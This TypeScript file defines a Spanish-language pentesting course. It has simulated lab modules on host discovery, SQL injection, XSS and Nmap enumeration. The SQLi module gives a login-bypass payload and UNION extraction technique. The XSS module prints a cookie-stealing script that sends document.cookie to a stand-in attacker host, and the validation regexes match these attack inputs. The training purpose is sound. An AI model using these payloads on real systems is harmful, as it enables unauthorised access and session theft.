export interface ModuleContent {
    id: string;
    title: string;
    description: string;
    difficulty: 'Principiante' | 'Intermedio' | 'Avanzado';
    theory_block: string; // The "Ground Truth" text
    lab_config: {
        target_ip: string;
        target_os: string;
        open_ports: number[];
        vulnerabilities: string[];
    };
    success_criteria: string[];
    validation_rules?: {
        allowed_commands: RegExp[]; // Regex list for valid commands in this module
        expected_output_match?: string[]; // Keywords to simulate in output
    };
}

export const ACADEMIC_CURRICULUM: Record<string, ModuleContent> = {
    'Fundamentos': {
        id: 'MOD-001',
        title: 'Fundamentos de Reconocimiento Activo (Network Discovery)',
        description: 'Aprende a mapear una red desconocida utilizando el protocolo ICMP y TCP.',
        difficulty: 'Principiante',
        lab_config: {
            target_ip: '10.10.10.5',
            target_os: 'Linux Ubuntu 20.04 LTS',
            open_ports: [22, 80],
            vulnerabilities: []
        },
        theory_block: `
# FASE 1: DESCUBRIMIENTO DE HOSTS (HOST DISCOVERY)

## Concepto Técnico
El "Host Discovery" es el primer paso en cualquier prueba de penetración (Pentesting). Antes de buscar vulnerabilidades, debes saber qué equipos están "vivos" (encendidos y conectados) en la red objetivo.

## El Protocolo ICMP
La forma más básica de descubrimiento es el mensaje **ICMP Echo Request** (Type 8).
- Tú envías: "¿Estás ahí?" (Echo Request)
- El objetivo responde: "Sí, estoy aquí" (Echo Reply - Type 0)

Herramienta principal: \`ping\`

## El Problema de los Firewalls Modernos
Los firewalls de Windows y muchos sistemas Linux bloquean ICMP por defecto. Un sistema puede estar "vivo" pero no responder al ping. Aquí es donde entra **Nmap** (Network Mapper).

## Técnicas de Nmap para Descubrimiento
Cuando ICMP falla, Nmap usa trucos TCP:
1. **TCP SYN Ping (-PS):** Envía un paquete SYN (inicio de conexión) al puerto 80/443. Si recibe un SYN/ACK (puerto abierto) o RST (puerto cerrado), sabe que el host existe.
2. **ARP Ping (-PR):** Si estás en la misma red local (LAN), usa el protocolo ARP, que es imposible de bloquear por firewalls convencionales.

## TU MISIÓN
Estás conectado a la red corporativa simulada. Se te ha asignado investigar la IP objetivo definida en la configuración del laboratorio.
        `,
        success_criteria: [
            "Identificar el estado del host (UP/DOWN)",
            "Determinar la latencia de red (TTL)",
            "Realizar un escaneo sin resolución DNS para mayor velocidad"
        ],
        validation_rules: {
            allowed_commands: [
                /^ping\s+[\w.-]+$/,
                /^nmap\s+.*-sn.*$/,
                /^nmap\s+.*-PS.*$/,
                /^nmap\s+.*-PR.*$/
            ],
            expected_output_match: ["Host is up", "ttl=", "MAC Address"]
        }
    },
    'SQL Injection': {
        id: 'MOD-002',
        title: 'Inyección SQL (SQLi) - Manipulación de Bases de Datos',
        description: 'Compromete la autenticación de una aplicación web manipulando consultas SQL.',
        difficulty: 'Intermedio',
        lab_config: {
            target_ip: '10.10.10.15',
            target_os: 'CentOS 7',
            open_ports: [80, 3306],
            vulnerabilities: ['SQL Injection (Login Bypass)', 'Union-Based SQLi']
        },
        theory_block: `
# FASE 2: INYECCIÓN SQL (SQLi)

## Concepto Técnico
Una Inyección SQL ocurre cuando una aplicación web inserta datos no confiables (input del usuario) directamente en una consulta de base de datos sin sanitización adecuada. Esto permite a un atacante alterar la estructura de la consulta.

## Mecánica del Ataque: Tautologías
El ataque más común para bypassear logins es la tautología (una afirmación que siempre es verdadera).

Consulta Original (Vulnerable):
\`SELECT * FROM users WHERE username = '$user' AND password = '$pass';\`

Input Malicioso para obtener acceso:
User: \`admin' OR 1=1 --\`

Consulta Resultante:
\`SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = '...';\`

- \`OR 1=1\`: Hace que la condición sea siempre VERDADERA.
- \`--\`: Comenta el resto de la consulta (anulando la verificación de contraseña).

## Inyecciones UNION
Para extraer datos, usamos el operador \`UNION SELECT\`. Esto permite combinar los resultados de la consulta original con resultados de otra tabla que nosotros elijamos (ej. la tabla de usuarios y contraseñas).

Requisito: Ambas consultas deben tener el **mismo número de columnas**.

## TU MISIÓN
El portal de administración en el objetivo es vulnerable. Tu objetivo es eludir el mecanismo de autenticación y, si es posible, enumerar la versión de la base de datos.
        `,
        success_criteria: [
            "Realizar un bypass de autenticación exitoso",
            "Identificar el número de columnas con ORDER BY",
            "Extraer la versión de la base de datos",
            "Obtener hashes de contraseñas de la tabla de usuarios"
        ],
        validation_rules: {
            allowed_commands: [
                /.*'.*OR.*1=1.*/i,  // Generic tautology
                /.*UNION.*SELECT.*/i,
                /.*ORDER.*BY.*/i,
                /.*admin' --.*/
            ],
            expected_output_match: ["Welcome, admin!", "MySQL v5.7.33", "Database: production"]
        }
    },
    'Web Exploitation': {
        id: 'MOD-003',
        title: 'Cross-Site Scripting (XSS) y Seguridad del Lado del Cliente',
        description: 'Ejecuta código arbitrario en navegadores de otros usuarios mediante vulnerabilidades XSS.',
        difficulty: 'Intermedio',
        lab_config: {
            target_ip: '10.10.10.20',
            target_os: 'Debian 11',
            open_ports: [8080],
            vulnerabilities: ['Stored XSS', 'Reflected XSS']
        },
        theory_block: `
# FASE 3: CROSS-SITE SCRIPTING (XSS)

## Concepto Técnico
XSS permite a un atacante inyectar scripts maliciosos (generalmente JavaScript) en páginas web vistas por otros usuarios. A diferencia de SQLi (que ataca al servidor), XSS ataca al **cliente (navegador)**.

## Tipos de XSS
1. **Reflected (No Persistente):** El script malicioso viaja en la URL. Se ejecuta cuando la víctima hace clic en un enlace manipulado.
   - *Ejemplo:* \`http://sitio.com/search?q=<script>alert(1)</script>\`

2. **Stored (Persistente):** El script se guarda permanentemente en el servidor (ej. en un comentario de un blog). Cada vez que alguien ve el comentario, el script se ejecuta.

## El Peligro: Robo de Sesiones
JavaScript tiene acceso a \`document.cookie\`. Si las cookies de sesión no tienen la bandera \`HttpOnly\`, un atacante puede robarlas y suplantar la identidad de la víctima.

Payload clásico para robo de cookies:
\`<script>fetch('http://atacante.com/log?cookie=' + document.cookie)</script>\`

## TU MISIÓN
Identificar campos de entrada que no sanean caracteres especiales (<, >, ', ") e intentar inyectar un script que demuestre la ejecución de código (PoC: Alert Box).
        `,
        success_criteria: [
            "Identificar parámetros vulnerables en la URL o formularios",
            "Ejecutar un payload básico de prueba (alert/confirm)",
            "Comprender la diferencia entre contextos HTML y atributos JS",
            "Simular el robo de una cookie de sesión"
        ],
        validation_rules: {
            allowed_commands: [
                /.*<script>.*alert\(.*\).*<\/script>.*/,
                /.*document\.cookie.*/,
                /.*fetch\(.*\).*/,
                /.*<img.*src=x.*onerror=.*/
            ],
            expected_output_match: ["Request intercepted", "Cookie: session_id=", "XSS Vulnerability Detected"]
        }
    },
    'Network Scanning': {
        id: 'MOD-004',
        title: 'Enumeración Avanzada y Detección de Servicios',
        description: 'Profundiza en el reconocimiento utilizando scripts NSE y técnicas avanzadas de Nmap.',
        difficulty: 'Avanzado',
        lab_config: {
            target_ip: '10.10.10.25',
            target_os: 'Windows Server 2019',
            open_ports: [53, 80, 135, 139, 445, 3389],
            vulnerabilities: ['SMB Signing Disabled', 'Outdated IIS', 'Default SNMP Credentials']
        },
        theory_block: `
# FASE 4: ENUMERACIÓN DE SERVICIOS Y VULNERABILIDADES

## Concepto Técnico
Saber que un puerto está abierto (Fase 1) no es suficiente. Necesitamos saber:
1. **Qué servicio** corre ahí (Apache, Nginx, IIS?).
2. **Qué versión** exacta tiene (v2.4.49?).
3. **Qué Sistema Operativo** aloja los servicios.

## Nmap Scripting Engine (NSE)
El verdadero poder de Nmap reside en sus scripts (escritos en Lua).
- \`-sC\`: Ejecuta scripts por defecto (seguros y útiles).
- \`-sV\`: Intenta determinar la versión del servicio analizando las respuestas (banco de huellas).
- \`--script=vuln\`: Ejecuta scripts que buscan vulnerabilidades conocidas (CVEs) directamente.

## Enumeración Específica por Servicio
- **SMB (445):** Podemos listar recursos compartidos, usuarios y grupos sin contraseña si hay mala configuración (Null Session).
- **HTTP (80/443):** Buscar archivos ocultos (robots.txt), tecnologías web (Wappalyzer) y cabeceras inseguras.

## TU MISIÓN
Realizar un escaneo agresivo (\`-A\`) sobre el objetivo para obtener la máxima información posible. Analizar los resultados para encontrar vectores de ataque potenciales basados en versiones de software obsoletas.
        `,
        success_criteria: [
            "Detectar versiones exactas de servicios (Banner Grabbing)",
            "Identificar el Sistema Operativo con precisión",
            "Listar scripts NSE ejecutados y sus resultados",
            "Encontrar al menos un servicio con configuración insegura"
        ],
        validation_rules: {
            allowed_commands: [
                /^nmap\s+.*-sV.*$/,
                /^nmap\s+.*-sC.*$/,
                /^nmap\s+.*-A.*$/,
                /^nmap\s+.*--script.*$/
            ],
            expected_output_match: ["Apache httpd 2.4.49", "Windows Server 2019", "SMB Signing: disabled", "VULNERABLE"]
        }
    }
};
